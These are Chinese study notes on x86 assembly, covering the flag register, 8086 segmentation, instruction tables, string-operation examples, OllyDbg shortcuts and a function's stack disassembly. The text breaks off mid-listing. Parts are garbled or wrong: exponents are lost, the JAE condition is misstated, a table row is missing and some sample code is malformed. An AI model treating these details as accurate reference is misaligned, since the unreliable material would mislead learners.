title="标志寄存器"></a>标志寄存器</h2><p>标志寄存器flag是一个16位的寄存器，其中每一个位单独使用的，</p><table><thead><tr><th>0</th><th>CF</th><th>进位</th><th>CY/NC</th></tr></thead><tbody><tr><td>1</td><td></td><td></td><td></td></tr><tr><td>2</td><td>PF</td><td>奇偶</td><td>PE/PO</td></tr><tr><td>3</td><td></td><td></td><td></td></tr><tr><td>4</td><td>AF</td><td>辅助</td><td>AC/NA</td></tr><tr><td>5</td><td></td><td></td><td></td></tr><tr><td>6</td><td>ZF</td><td>零</td><td>ZR/NZ</td></tr><tr><td>7</td><td>SF</td><td>符号</td><td>NG/PL</td></tr><tr><td>8</td><td>TF</td><td>陷阱</td><td></td></tr><tr><td>9</td><td>IF</td><td>中断</td><td>EI/DI</td></tr><tr><td>10</td><td>DF</td><td>方向</td><td>DN/UP</td></tr><tr><td>11</td><td>OF</td><td>溢出</td><td>OV/NV</td></tr><tr><td>12</td><td></td><td></td><td>真/假</td></tr><tr><td>13</td><td></td><td></td><td>DEBUG标志位状态</td></tr><tr><td>14</td><td></td><td></td><td></td></tr></tbody></table><h3 id="状态标志"><a href="#状态标志" class="headerlink" title="状态标志"></a>状态标志</h3><p>用来记录程序运行结果的状态信息，许多指令的执行都将相应的设置它CF,ZF,SF,PF,OF,AF</p><h3 id="控制标志"><a href="#控制标志" class="headerlink" title="控制标志"></a>控制标志</h3><p>可由程序根据需要用的指令设置，用于控制处理的执行方式DF,IF,TF</p><p>其中比较重要的是CF,OF,ZF,SF</p><h4 id="进位标志CF"><a href="#进位标志CF" class="headerlink" title="进位标志CF"></a>进位标志CF</h4><p>进位标志CF（ Carry Flag），当运算结果的最高有效位有进位（加法）或借位（减法）</p><p>时，进位标志置1，即CF=1否则CF=0</p><p>例子：</p><p>3A+7C=B6，没有进位：CF=0AA+7C=（1）26，有进位：CF=1</p><h4 id="溢出标志"><a href="#溢出标志" class="headerlink" title="溢出标志"></a>溢出标志</h4><p>溢出标志OF（ Overflow Flag），若算术运算的结果有溢出，则OF=1，否则OF=0</p><p>什么是溢出：16位的范围是（+32767~-32768），如果运算结果超出这个范围，就产生了溢出，有溢出，说明有符号数的运算结果不正确例子</p><p>3A+7C=B6，产生溢出：OF=1AA+7C=（1）26，没有溢出：OF=0溢出和进位</p><p>溢出标志F和进位标志CF是两个意义不同的标志.进位是针对无符号数而言，溢出是针对有符号数而言。在汇编指令运算时，大多数不区分有符号数还是无符号数，</p><p>都按照无符号去计算结果，然后根据无符号，有符号运算，设置相应标记位而已</p><p>例如：F+2=（1）01</p><p>按照无符号数来说，它进位了，会设置CF标记位按照有符号数来说，它没有溢出，所以不会设置F标记位</p><p>根据现象记住溢出与进位：</p><p>按照有符号数运算，同号相加才会产生溢出，异号相加，不会溢出</p><p>两个数相加，超过F，就会进位</p><p>做减法时，前面的数比后面的数小，会借位。进位和溢出没有逻辑上的联系</p><h3 id="零标志ZF"><a href="#零标志ZF" class="headerlink" title="零标志ZF"></a>零标志ZF</h3><p>零标志ZF（ Zero Flag），若运算结果为0，则ZF=1：否则ZF=0（注意：ZF为1表</p><p>示的结果是0）</p><p>例子</p><p>3A+7C=B6，结果不是零：ZF=084+7C=（1）00，结果是零：ZF=1</p><h3 id="符号标志"><a href="#符号标志" class="headerlink" title="符号标志"></a>符号标志</h3><p>符号标志SF（ Sign Flag），运算结果最高位为1，则SF=1；否则SF=0（有符号数据用最高有效位表示数据的符号，所以最高有效位就是符号标志的状态）例子</p><p>3A+7C=B6，最高位D2=1：SF84+7C=（1）00，最高位D2=0：SF</p><h3 id="奇偶标志"><a href="#奇偶标志" class="headerlink" title="奇偶标志"></a>奇偶标志</h3><p>奇偶标志P（ Parity Flag），当运算结果最低8位中“1”的个数为零或偶数时，PF=1，否则PF=0（F标志仅反映最低8位中“1”的个数是偶或奇，即使是进行16位字操作</p><p>例子</p><p>3A+7C=B6=10110110B结果中有5个1，是奇数：PF=0</p><h3 id="辅助进位标志"><a href="#辅助进位标志" class="headerlink" title="辅助进位标志"></a>辅助进位标志</h3><p>辅助进位标志F（ Auxiliary Carry Flag），运算时D位（低半字节）有进位或借位时，AF=1，否则AF=0（这个标志主要由处理器内部使用，用于十进制算术运算调整指令中，用户一般不必关心）</p><p>例子：</p><p>3AH+7CH=B6H，D有进位：AF=1</p><h3 id="方向标志"><a href="#方向标志" class="headerlink" title="方向标志"></a>方向标志</h3><p>方向标志DF（ Direction Flag），用于串操作指令中，控制地址的变化方向：设置F=0，存储器地址自动增加设置DF=1，存储器地址自动减少。</p><p>CLD指令用于复位方向标志，执行后DF=0STD指令用于置位方向标志，执行后DF=1</p><h3 id="中断允许标志"><a href="#中断允许标志" class="headerlink" title="中断允许标志"></a>中断允许标志</h3><p>中断允许标志IF（ Interrupt- enable Flag），用于控制外部可屏蔽中断是否可以被</p><p>处理器响应：</p><p>设置IF=1，则允许中断设置IF=0，则禁止中断。例如</p><p>CLI指令用于复位中断标志，执行后IF=0ST指令用于置位中断标志，执行后IF=1</p><h3 id="陷阱标志"><a href="#陷阱标志" class="headerlink" title="陷阱标志"></a>陷阱标志</h3><p>陷阱标志TF（ Trap Flag），用于控制处理器进入单步操作方式设置TF=0，处理器正常工作设置TF=1，处理器单步执行指令。</p><p>单步执行指令：处理器在每条指令执行结束时，便产生一个编号为1的内部中断这种内部中断称为单步中断，所以TF也称为单步标志，利用单步中断可对程序进行逐条指令的调试，这种逐条指令调试程序的方法就是单步调试</p><h2 id="内存地址操作数"><a href="#内存地址操作数" class="headerlink" title="内存地址操作数"></a>内存地址操作数</h2><p>当操作数是一个内存地址的时候，如下所示</p><p> MOV [65h], 12h</p><p>地址操作数，需要在地址外包裹上[]，此条指令代表要往地址所在的内存中写入数据。8086CPU有20条地址线，最大可寻址空间为2=1MB，物理地址范围从0000~FH</p><h3 id="物理地址和逻辑地址"><a href="#物理地址和逻辑地址" class="headerlink" title="物理地址和逻辑地址"></a>物理地址和逻辑地址</h3><p>每个物理存储单元都有一个唯一的20位编号，就是物理地址，从0000~FFFH。那么8086-CPU的地址总线是20位，但是操作数最大只有16位。那么如何产生20位地址呢？8086-CPU采用了分段机制解决这个问题。分段后在用户编程时，采用逻辑地址，形式为：</p><h3 id="段基地址：段内偏移地址"><a href="#段基地址：段内偏移地址" class="headerlink" title="段基地址：段内偏移地址"></a>段基地址：段内偏移地址</h3><p>将逻辑地址中的段地址左移4位（相当于乘以16），加上偏移地址就得到20位物理地址，一个物理地址可以有多个逻辑地址，例如</p><p>逻辑地址1460：100、1380：F0物理地址1470014700物理地址的计算方法</p><p><strong>物理地址=段基地址×16+偏移地址</strong></p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>通常我们使用内存的时候，提供的都是一个段内偏移地址。段寄存器中存储的是段基地</p><p>址。不同类型的段内偏移和不同的段寄存器默认关联。</p><p>CS（代码段）指明代码段的起始地址</p><p>SS（堆段）指明堆栈段的起始地址</p><p>DS（数据段）指明数据段的起始地址</p><p>ES（附加段）指明附加段的起始地址</p><p>FS  在内存中的镜像 20 进程PID 24 线程ID 2c 指向线程局部存储的指针（32新增）</p><p>GS 。。。（32新增）</p><table><thead><tr><th>访问存储器的方式</th><th>默认</th><th>偏移地址</th><th>例子</th></tr></thead><tbody><tr><td>取指令</td><td>CS</td><td>IP</td><td>mov ax,[ip]</td></tr><tr><td>堆栈操作</td><td>SS</td><td>SP</td><td>mov ax,[sp]</td></tr><tr><td>一般数据访问</td><td>DS</td><td>有效地址EA</td><td>mov ax,[15h] 、mov ax,[bx]</td></tr><tr><td>BP基址的寻址方式</td><td>SS</td><td>有效地址EA</td><td>mov ax,[bp+6h]</td></tr><tr><td>串操作指令的源操作数</td><td>DS</td><td>SI</td><td>mov ax,[si]</td></tr><tr><td>串操作指令的目的操作数</td><td>ES</td><td>DI</td><td>mov ax,[di]</td></tr></tbody></table><h3 id="段超越"><a href="#段超越" class="headerlink" title="段超越"></a>段超越</h3><p>修改默认使用的段寄存器称为段超越没有段超越的指令实例： MOV AX,[2000:AX-DS:[2000从默认的DS数据段取出数据采用段超越前缀的指令实例 MOV AX,ES:[2000:AX-ES:[2000</p><p>：从指定的ES附加段取出数据</p><h3 id="理解分段的误区"><a href="#理解分段的误区" class="headerlink" title="理解分段的误区"></a>理解分段的误区</h3><p>通常，初次接触分段机制的时候，大家都会有一个认识上的误区，认为内存被划分成了个一个的段，每一个段有一个段基址和范围。</p><p>其实：8086-CPU共有20位地址总线，能够表示的地址空间是1MB，这块空间在物理上是连续的。为了方便管理，我们在逻辑上将其划分成多个段。逻辑段与另一个逻辑段是可以覆盖或者重合的。我们可以通过一些总结，更好的理解分段</p><p>8086对逻辑段要求</p><p>段地址低4位均为0每段最大不超过64KB8086对逻辑段并不要求：</p><p>必须是64KB</p><p>各段之间完全分开（即可以重叠）1MB空间最多能分成多少个段？</p><p>每隔16个存储单元就可以开始一个段，所以IMB最多可以有：2÷16=2”=64K个段1MB空间最少能分成多少个段每隔64K个存储单元开始一个段所以1MB最少可以有：2÷2=16个段</p><h3 id="内存操作数的多种书写形式"><a href="#内存操作数的多种书写形式" class="headerlink" title="内存操作数的多种书写形式"></a>内存操作数的多种书写形式</h3><p>当内存地址作为指令操作数的时候，可以有多种书写形式</p><table><thead><tr><th>操作数形式</th><th>解释</th></tr></thead><tbody><tr><td>mov ax,[0x1234]</td><td>从ds：1234中取出两个字节，存入ax中</td></tr><tr><td>mov ax,word ptr[0x1234]</td><td>从ds：1234中取出两个字节，存入ax中</td></tr><tr><td>mov al,[0x1234]</td><td>从ds：1234中取出一个字节，存入al中</td></tr><tr><td>mov al,byte ptr [0x1234]</td><td>从ds：1234中取出一个字节，存入al中</td></tr><tr><td>mov ax,ES:[0x1234]</td><td>从es：1234中取出两个字节，存入ax中</td></tr><tr><td>mov ax,word ptr CS:[0x1234]</td><td>从cs：1234中取出两个字节，存入ax中</td></tr><tr><td>mov ax,[bx][si]</td><td>等价于mov ax,[bx+si]</td></tr><tr><td>mov ax,12[si]</td><td>等价于mov ax,[si+12]</td></tr></tbody></table><h3 id="x86分段机制"><a href="#x86分段机制" class="headerlink" title="x86分段机制"></a>x86分段机制</h3><p>在CPU进化到386时，操作系统普遍采用的时32位下的保护模式，分段机制发生了很大的变化，我们暂且认为32位程序中，所有的段基址都是0，段内偏移范围时0~4Gb，这也被称之位平坦模式</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈（Stack）是主存中一个特殊的区域，本质上不属于寄存器</p><p>它采用先进后出FILO（First In Last Out）或后进先出的原则尽心存取操作，而不是随机存取的操作方式</p><p>堆栈通常由处理器自动维持，在8086中，由堆栈段寄存器SS和堆栈指针寄存器SP共同指示</p><h1 id="基础汇编指令"><a href="#基础汇编指令" class="headerlink" title="基础汇编指令"></a>基础汇编指令</h1><h2 id="操作数类型"><a href="#操作数类型" class="headerlink" title="操作数类型"></a>操作数类型</h2><table><thead><tr><th>操作数简写</th><th>含义</th><th>举例</th></tr></thead><tbody><tr><td>r8</td><td>任意八位通用寄存器</td><td>AH AL BH BL CH CL DH DL</td></tr><tr><td>r16</td><td>任意一个16位通用寄存器</td><td>AX BX CX DX  SI DI BP SP</td></tr><tr><td>r32</td><td>任意一个32位的寄存器</td><td>EAX EBX ECX EDX ESI EDI EBP ESP</td></tr><tr><td>reg</td><td>代表所有r8或者r16或者r32</td><td>以上全部</td></tr><tr><td>seg</td><td>段寄存器</td><td>CS DS ES SS</td></tr><tr><td>m8</td><td>一个8位存储器操作单元</td><td>BYTE PTR DS:[0x12345678]</td></tr><tr><td>m16</td><td>一个16位存储器操作单元</td><td>WORD PTR DS:[0X12345678]</td></tr><tr><td>m32</td><td>一个32位存储器操作单元</td><td>DWORD PTR DS:[0X12345678]</td></tr><tr><td>mem</td><td>代表所有r8或者r16或者r32</td><td>以上全部</td></tr><tr><td>i8</td><td>8位数字</td><td></td></tr><tr><td>i16</td><td>16位数字</td><td></td></tr><tr><td>i32</td><td>32位数字</td><td></td></tr><tr><td>imm</td><td>一个数字</td><td></td></tr></tbody></table><h2 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h2><table><thead><tr><th>指令</th><th>操作数1</th><th>操作数2</th><th>执行操作</th></tr></thead><tbody><tr><td>mov</td><td>reg</td><td>reg/mem/imm</td><td>将操作数2的值传送到操作数1中</td></tr><tr><td></td><td>mem</td><td>reg/imm</td><td></td></tr><tr><td></td><td>seg</td><td>reg16/mem16</td><td></td></tr><tr><td>xchg</td><td>reg</td><td>reg/imm</td><td>将操作数1和操作数2的内容进行交换</td></tr><tr><td></td><td>mem</td><td>reg</td><td></td></tr><tr><td>lea</td><td>reg</td><td>reg/mem</td><td>将源操作数的地址传送到目标操作数的寄存器中</td></tr><tr><td>push</td><td>reg/mem/seg/imm</td><td></td><td>将操作数1中的内存放到堆栈中，esp自减4</td></tr><tr><td>pop</td><td>reg/mem/seg</td><td></td><td>将栈顶的数据存放到操作数1中，esp自加4</td></tr><tr><td>pushf</td><td></td><td></td><td>将eflag存放到堆栈中，esp自减4</td></tr><tr><td>popf</td><td></td><td></td><td>将栈顶的数据存放到eflag中，esp自加4</td></tr><tr><td>pushad</td><td></td><td></td><td>将所有寄存器压入堆栈</td></tr><tr><td>popad</td><td></td><td></td><td>从栈顶开始，将数据存入各个寄存器</td></tr></tbody></table><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><table><thead><tr><th>指令</th><th>操作数1</th><th>操作数2</th><th>操作数3</th><th>执行操作</th></tr></thead><tbody><tr><td>add</td><td>reg</td><td>reg/mem/imm</td><td></td><td>将操作数1与操作数2相加，并将结果保存在目标操作数中</td></tr><tr><td></td><td>mem</td><td>reg/imm</td><td></td><td></td></tr><tr><td>adc</td><td>reg</td><td>reg/mem/imm</td><td></td><td>将操作数1和操作数2相加并和标志寄存器CF位的值一起加到操作数1中</td></tr><tr><td></td><td>mem</td><td>reg/imm</td><td></td><td></td></tr><tr><td>sub</td><td>reg</td><td>reg/mem/imm</td><td></td><td>将操作数1与源操作数2相减，将结果保存到操作数1中</td></tr><tr><td></td><td>mem</td><td>reg/imm</td><td></td><td></td></tr><tr><td>sbb</td><td>reg</td><td>reg/mem/imm</td><td></td><td>将操作数1与源操作数2相减，再减去CF标志位，将结果保存到操作数1中</td></tr><tr><td></td><td>mem</td><td>reg/imm</td><td></td><td>将目标操作数自加1，同时CF标志不变</td></tr><tr><td>dec</td><td>reg/mem</td><td></td><td></td><td>减目标操作数自减1，同时CF标志不变</td></tr><tr><td>mul</td><td>reg/mem</td><td></td><td></td><td>将AL/AXEAX和操作数1相乘，结果放置在EDX：EAX中</td></tr><tr><td>imul</td><td>reg/mem</td><td>add</td><td></td><td>将AL/AXEAX和操作数1相乘，结果放置在EDX：EAX中，此为有符号操作</td></tr><tr><td></td><td>reg</td><td>reg/mem/imm</td><td></td><td>将操作数1和操作数2相乘，将乘积保存在操作数1中，此为有符号操作</td></tr><tr><td></td><td>reg</td><td>reg/mem</td><td>imm</td><td>将操作数1，2，3相乘，结果保存在1中</td></tr><tr><td>div</td><td>reg/mem</td><td></td><td></td><td>将AX、DX：AX或EDX:EAX中的值除以操作数1，结果存储到AX（AH：AL）、DX：AX或EDX:EAX寄存器，此为无符号操作</td></tr><tr><td>idiv</td><td>reg/mem</td><td></td><td></td><td>将AL、AX或EAX寄存器中的值除以源操作数，结果存储到AX、DX：AX或EDX:EAX寄存器，此为有符号操作</td></tr></tbody></table><h2 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h2><table><thead><tr><th>指令</th><th>操作数1</th><th>操作数2</th><th>执行操作</th></tr></thead><tbody><tr><td>and</td><td>reg</td><td>reg/mem/imm</td><td>将操作数1与操作数2进行按位与运算，结果存储到操作数1中</td></tr><tr><td></td><td>mem</td><td>reg/imm</td><td></td></tr><tr><td>or</td><td>reg</td><td>reg/mem/imm</td><td>将操作数1与操作数2进行按位或运算，结果存储到操作数1中</td></tr><tr><td></td><td>mem</td><td>regimm</td><td></td></tr><tr><td>xor</td><td>reg</td><td>reg/mem/imm</td><td>将操作数1与操作数2进行按位异或运算，结果存储到操作数1中</td></tr><tr><td></td><td>mem</td><td>reg/imm</td><td></td></tr><tr><td>not</td><td>reg/mem</td><td></td><td>对目标操作数执行按位取反结果存储到目标操作数位置</td></tr><tr><td>shl</td><td>reg</td><td>imm</td><td>对给定的目标操作数左移imm/CL次，每次移位时最高移入标志位CF中，最低为补0</td></tr><tr><td></td><td>reg</td><td>CL</td><td></td></tr><tr><td>shr</td><td>reg</td><td>imm</td><td>对给定的目标操作数右移imm/CL次，每次位移最低位移至标志位CF中</td></tr><tr><td></td><td>reg</td><td>CL</td><td></td></tr></tbody></table><h2 id="逻辑指令"><a href="#逻辑指令" class="headerlink" title="逻辑指令"></a>逻辑指令</h2><p>逻辑运算符都不会得到结果，仅仅设置标志寄存中相应的标志位</p><table><thead><tr><th>指令</th><th>操作数1</th><th>操作数2</th><th>执行操作</th></tr></thead><tbody><tr><td>cmp</td><td>reg</td><td>reg/mem/imm</td><td>用操作数1减去操作数2，并根据结果设置Eflag寄存器中的状态，然后丢弃结果</td></tr><tr><td>test</td><td>reg</td><td>reg/mem/imm</td><td>将操作数1与操作数2按位与操作，然后根据结果设置ZF，PF状态标志</td></tr></tbody></table><h1 id="串操作指令与控制转移"><a href="#串操作指令与控制转移" class="headerlink" title="串操作指令与控制转移"></a>串操作指令与控制转移</h1><h2 id="串操作指令"><a href="#串操作指令" class="headerlink" title="串操作指令"></a>串操作指令</h2><p>被用于操作某一内存区域中由相同类型数据构成一个整体（相当于一个数组），这个结构一般被用于保存字符串或其它连续存放的单一类型数据</p><table><thead><tr><th>指令</th><th>操作数1</th><th>操作数2</th><th>执行操作</th><th>类比</th></tr></thead><tbody><tr><td>movsb/w/d</td><td>ES:[EDI]</td><td>DS:[ESI]</td><td>将操作数2的值直接传送到操作数1中，同时EDI与ESI自增1</td><td>memcpy</td></tr><tr><td>stosb/w/d</td><td>DS:[EDI]</td><td></td><td>将AL、AX、或EAX寄存器的字节，字或双字存储到目标操作数</td><td>memset</td></tr><tr><td>lodsb/w/d</td><td>DS:[ESI]</td><td></td><td>将源操作数中的字节，字或双字分别加载到AL、AX、EAX寄存器中</td><td></td></tr><tr><td>cmpsb/w/d</td><td>ES:[EDI]</td><td>DS:[ESI]</td><td>比较一个源操作数指定的字节、字或双字与第二个源操作数指定的字节、字或双字，根据结果设置eflag寄存器中的状态标志</td><td>memcmp</td></tr><tr><td>rep/repe</td><td></td><td></td><td>与串操作指令联用，重复执行串指令ecx次，每执行一次ecx减一，当ecx为0时或zf为0的时候结束重复</td><td></td></tr><tr><td>repne</td><td></td><td></td><td>与串操作指令联用，重复执行串指令ecx次，每执行一次ecx减一，当ecx为0时或zf为1的时候结束重复</td><td></td></tr></tbody></table><h2 id="控制转移指令"><a href="#控制转移指令" class="headerlink" title="控制转移指令"></a>控制转移指令</h2><table><thead><tr><th>指令</th><th>操作数1</th><th>执行操作</th><th>类比</th></tr></thead><tbody><tr><td>JMP</td><td>reg/mem/imm</td><td>跳转到操作数1所指向的地址，从目标地址处执行指令</td><td>goto</td></tr><tr><td>LOOP</td><td>imm</td><td>跳转到操作数1所指向的地址，同时ECS减1.当ECX为0时，不会跳转</td><td></td></tr><tr><td>CALL</td><td>reg/mem/imm</td><td>跳转到操作数1所指向的地址，同时将CALL指令后面的指令所在的地址压入堆栈</td><td></td></tr><tr><td>RET</td><td>imm</td><td>从栈顶获取数据当作地址并跳转，同时栈顶数据出栈，即ESP+4</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>指令</th><th>解释</th><th>条件</th></tr></thead><tbody><tr><td>JA</td><td>jump if above(大于)</td><td>CF == 0 and ZF == 0</td></tr><tr><td>JAE</td><td>jump if above or Equal（大于等于)</td><td>CF == 1</td></tr><tr><td>JB</td><td>&lt;</td><td>CF ==1</td></tr><tr><td>JBE</td><td>&lt;=</td><td>CF == 1 OR ZF ==1</td></tr><tr><td>JC</td><td>&lt;</td><td>CF ==1</td></tr><tr><td>JG</td><td>有符号 &gt;</td><td>ZF ==0 AND SF == OF</td></tr><tr><td>JGE</td><td>有符号 &gt;=</td><td>SF == OF</td></tr><tr><td>JL</td><td>有符号 &lt;</td><td>SF != OF</td></tr><tr><td>JLE</td><td>有符号 &lt;=</td><td>ZF ==1 OR SF !=OF</td></tr><tr><td>JO</td><td>溢出</td><td>OF==1</td></tr><tr><td>JNO</td><td>不溢出</td><td>OF==0</td></tr><tr><td>JNZ</td><td>不相等 ！=</td><td>zf==0</td></tr></tbody></table><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>例1：拷贝字符串例                                        </p><p> lea esi，[0x100]；串拷贝的源地址                        </p><p> lea edi，[0x120]串拷贝的目的地址                    </p><p> mov ecx，0x10；拷贝的字节数为0x10              </p><p> cld；清除方向标志DF，控制串操操作方向为递增                </p><p>rep movsd；使用重复前缀rep重复执行</p><p>例2：填充字符串</p><p>lea edi，[0x120]；串填充的目的地址</p><p>mov eax，0x31；串填充的内容31=1 </p><p>mov ecx，0x10；串填充的执行次数</p><p>cld；清除方向标志DF，控制串操作方向为递增                        </p><p> rep stosd；使用重复前缀rep重复执行</p><p>例3：计算数组元素之和</p><p> lea es，[120]；数组的起始地址例</p><p> mov ecx，10；控制loop指令的执行次数</p><p> xor eax，eax；将eax清空方便读取内容 </p><p> xor edx，edx；将edx清空，保存累加结果</p><p> cld ；清除方向标志DF，控制串操作方向为递增；</p><p> XXX: </p><p> lodsd；将指定位置的字符读取到eax中</p><p> add edx,eax；做加法计算</p><p> loop xoxx ;跳转到“lodsb”指令处，并将 ecx减1，直到ecx为0</p><p>例4：比较字符串</p><p>ea esi，[0x100]；串比较的源地址</p><p>lea edi，[0x120]；串比较的目的地址</p><p>mov ecx，0x10；比较的字节数为0x10</p><p>cld ；清除方向标志DF，控制串操作方向为递增</p><p> repe cmpsb；循环比较直到cx为0或ZF为0时结束</p><p> lodsd</p><p> je XXX；如果相等，则跳转到后面xxx</p><p> mov bx，1；否则将bx置为1</p><h1 id="OD使用"><a href="#OD使用" class="headerlink" title="OD使用"></a>OD使用</h1><h2 id="OD窗口"><a href="#OD窗口" class="headerlink" title="OD窗口"></a>OD窗口</h2><p> L : log 保存日志信息</p><p> E ：程序的所有模块的信息（加载基址，大小，OEP，路径）</p><p> M ：程序的内存映射视图 </p><p>T ： 线程信息 </p><p>W ：窗口信息 </p><p>H ：句柄表 </p><p>C ：CPU窗口（反汇编窗口）</p><p> / ：补丁信息 K ：调用堆栈 </p><p>B ：软件断点列表 </p><p>R ：显示参考（数据引用等）</p><p> … : RUN跟踪</p><p> S ： 源码显示窗口 </p><h2 id="OD快捷方式"><a href="#OD快捷方式" class="headerlink" title="OD快捷方式"></a>OD快捷方式</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>F2</td><td>设置或取消断点</td></tr><tr><td>F4</td><td>执行到当前光标选中的指令</td></tr><tr><td>F7</td><td>单步步入，遇到call指令跟进</td></tr><tr><td>Ctrl + F7</td><td>重复F7，指定按Esc、F12或者遇到其它断点时停止</td></tr><tr><td>F8</td><td>单步步过，遇到call指令时，不跟进</td></tr><tr><td>Ctrl + F8</td><td>重复按F8，指定按Esc、F12或者遇到其它断点时停止</td></tr><tr><td>F9</td><td>运行程序</td></tr><tr><td>Ctrl + F9</td><td>直到出现ret指令时中断</td></tr><tr><td>Alt + F9</td><td>若进入到系统领域，此命令可回到应用程序领域</td></tr><tr><td>Ctrl + F12</td><td>重启调试</td></tr><tr><td>Ctrl + G</td><td>跳转到指定内存的地址</td></tr><tr><td>Ctrl + F</td><td>搜索指令</td></tr><tr><td>Ctrl + S</td><td>搜索指令（多条）</td></tr><tr><td>Ctrl + L</td><td>搜索下一条指令</td></tr><tr><td>Ctrl + A</td><td>分析代码</td></tr><tr><td>Ctrl + E</td><td>修改内存</td></tr><tr><td>Ctrl + B</td><td>二进制搜索</td></tr><tr><td>Ctrl + X</td><td>复制地址</td></tr><tr><td>Shift + X</td><td>复制二进制数据</td></tr><tr><td>Alt + B</td><td>打开断点窗口</td></tr><tr><td>-（减号）</td><td>回到之前单步的代码</td></tr><tr><td>双击EIB寄存器</td><td>让光标回到EIB所指向的语句</td></tr><tr><td>Enter</td><td>进入函数（跟踪指令）</td></tr></tbody></table><h1 id="函数栈布局"><a href="#函数栈布局" class="headerlink" title="函数栈布局"></a>函数栈布局</h1><p>C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (a &gt; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">m = Max(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对应汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">-------main函数------------</span><br><span class="line">007137D0 55 PUSH EBP ; 保存旧EBP</span><br><span class="line">007137D1 8BEC MOV EBP,ESP ; EBP和ESP相同，空栈</span><br><span class="line">007137D3 81EC CC000000 SUB ESP,0xCC</span><br><span class="line">007137D9 53 PUSH EBX ; 保存寄存器</span><br><span class="line">007137DA 56 PUSH ESI</span><br><span class="line">007137DB 57 PUSH EDI</span><br><span class="line">007137DC 8DBD 34FFFFFF LEA EDI,DWORD PTR SS:[EBP-0xCC] ; 局部空间的栈顶</span><br><span class="line">007137E2 B9 33000000 MOV ECX,0x33 ; 循环次数</span><br><span class="line">007137E7 B8 CCCCCCCC MOV EAX,0xCCCCCCCC ; 填充数据</span><br><span class="line">007137EC F3:AB REP STOS DWORD PTR ES:[EDI] ; 循环填充局部空间（0x33*4&#x3D;</span><br><span class="line">0xCC）</span><br><span class="line">007137EE B9 03B07D00 MOV ECX,汇编语言.007DB003</span><br><span class="line">007137F3 E8 93B7FFFF CALL 汇编语言.0070EF8B ;调试支持</span><br><span class="line">007137F8 C745 F8 0000000&gt;MOV DWORD PTR SS:[EBP-0x8],0x0 ；ebp-8代表 局部变量m</span><br><span class="line">007137FF 6A 14 PUSH 0x14 ;参数2 ：20</span><br><span class="line">00713801 6A 0A PUSH 0xA ;参数1 ：10</span><br><span class="line">00713803 E8 109EFFFF CALL 汇编语言.0070D618 ;调用MAX</span><br><span class="line">00713808 83C4 08 ADD ESP,0x8 ；平衡两个参数</span><br><span class="line">0071380B 8945 F8 MOV DWORD PTR SS:[EBP-0x8],EAX ;m &#x3D; eax</span><br><span class="line">0071380E 8B45 F8 MOV EAX,DWORD PTR SS:[EBP-0x8] ;</span><br><span class="line">;printf</span><br><span class="line">00713811 50 PUSH EAX ;eax: m值</span><br><span class="line">00713812 68 501E7B00 PUSH 汇编语言.007B1E50 ；“%d”</span><br><span class="line">00713817 E8 DB9BFFFF CALL 